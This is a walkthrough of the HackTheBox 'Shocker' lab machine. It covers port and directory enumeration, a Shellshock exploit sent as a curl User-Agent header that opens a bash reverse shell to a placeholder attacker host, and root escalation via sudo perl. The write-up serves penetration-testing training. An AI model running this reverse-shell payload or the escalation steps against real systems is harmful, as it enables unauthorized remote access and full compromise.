---
title: "Shoker"
platform: "HackTheBox"
difficulty: "Medium"
date: 2024-02-20
tags: ["shellshock"]
---

## Enumeration

![info card](media/shoker_infocard.png)

# Exploiting the Shocker Machine on HackTheBox: A Detailed Walkthrough

## Introduction

Shocker is an easy machine on HackTheBox that involves exploiting the Shellshock vulnerability to gain initial access and leveraging sudo permissions for privilege escalation. This walkthrough will guide you through the process of compromising the Shocker machine, from initial reconnaissance to gaining root access.

## Initial Enumeration

### Nmap Scan

The first step in any penetration test is enumeration. We start by scanning the target machine using Nmap to identify open ports and services.

```bash
nmap -sV -sC -p- 10.10.10.56 > nmap/service.log
```

**Nmap Results:**

```nmap
Starting Nmap 7.80 ( https://nmap.org ) at 2020-11-28 10:28 EST
Nmap scan report for 10.10.10.56
Host is up (0.39s latency).

PORT      STATE  SERVICE      VERSION
80/tcp    open   http         Apache httpd 2.4.18 ((Ubuntu))
|_http-server-header: Apache/2.4.18 (Ubuntu)
|_http-title: Site doesn't have a title (text/html).
2222/tcp  open   ssh          OpenSSH 7.2p2 Ubuntu 4ubuntu2.2 (Ubuntu Linux; protocol 2.0)
| ssh-hostkey: 
|   2048 c4:f8:ad:e8:f8:04:77:de:cf:15:0d:63:0a:18:7e:49 (RSA)
|   256 22:8f:b1:97:bf:0f:17:08:fc:7e:2c:8f:e9:77:3a:48 (ECDSA)
|_  256 e6:ac:27:a3:b5:a9:f1:12:3c:34:a5:5d:5b:eb:3d:e9 (ED25519)
25000/tcp closed icl-twobase1
Service Info: OS: Linux; CPE: cpe:/o:linux:linux_kernel

Service detection performed. Please report any incorrect results at https://nmap.org/submit/ .
Nmap done: 1 IP address (1 host up) scanned in 20.37 seconds
```

**Key Services Identified:**

- **HTTP (80):** Apache httpd 2.4.18
- **SSH (2222):** OpenSSH 7.2p2

### Web Enumeration

Visiting the HTTP service on port 80 revealed a simple webpage with no significant content.

**Webpage:**

![Webpage](media/shoker_webpage.png)

**Directory Brute-Forcing:**

Using `ffuf`, we discovered a directory named `cgi-bin`.

```bash
ffuf -w /usr/share/wordlists/dirb/common.txt -u http://10.10.10.56/FUZZ
```

**Key Directory Identified:**

- `/cgi-bin`

**Recursive Directory Brute-Forcing:**

We performed a recursive scan on `/cgi-bin` for `.bin`, `.sh`, and `.cgi` extensions, revealing a file named `user.sh`.

**Discovered File:**

![User.sh](media/shoker_user.png)

## Exploiting Shellshock

### Understanding Shellshock

Shellshock is a vulnerability in the Unix Bash shell that allows remote code execution. It affects systems that use Bash to process requests, such as CGI scripts.

### Crafting the Payload

We crafted a payload to exploit the Shellshock vulnerability and gain a reverse shell.

**Payload:**

```bash
curl -A “() { :; }; /bin/bash -i > /dev/tcp/attacker_ip/port 0<&1 2>&1” http://10.10.10.56/cgi-bin/user.sh
```

**Payload Breakdown:**

- `/bin/bash -i`: Defines that the shell must be interactive.
- `> /dev/tcp/attacker_ip/port`: Redirects the output of the shell to the attacker via a TCP connection.
- `0<&1 2>&1`: Indicates that input comes from the TCP connection, and output goes to the same TCP connection.

### Gaining Initial Access

Executing the payload provided a reverse shell on the machine.

**Reverse Shell Obtained:**

![User Flag](media/shoker_userflag.png)

## Privilege Escalation

### Enumerating Sudo Permissions

We checked the sudo permissions available to the current user.

```bash
sudo -l
```

**Sudo Permissions:**

```bash
User shelly may run the following commands on shocker:
    (root) NOPASSWD: /usr/bin/perl
```

### Exploiting Sudo Permissions

Using the sudo permissions, we escalated privileges to root by executing a shell with Perl.

**Privilege Escalation Command:**

```bash
sudo perl -e 'exec "/bin/sh";'
```

**Root Shell Obtained:**

![Root Shell](media/shoker_root.png)

## Conclusion

The Shocker machine on HackTheBox provided a comprehensive challenge, encompassing web application enumeration, Shellshock exploitation, and privilege escalation through sudo permissions. By methodically enumerating services and exploiting discovered vulnerabilities, we successfully compromised the machine and gained root access. This walkthrough underscores the importance of thorough enumeration and the effective use of discovered vulnerabilities in penetration testing.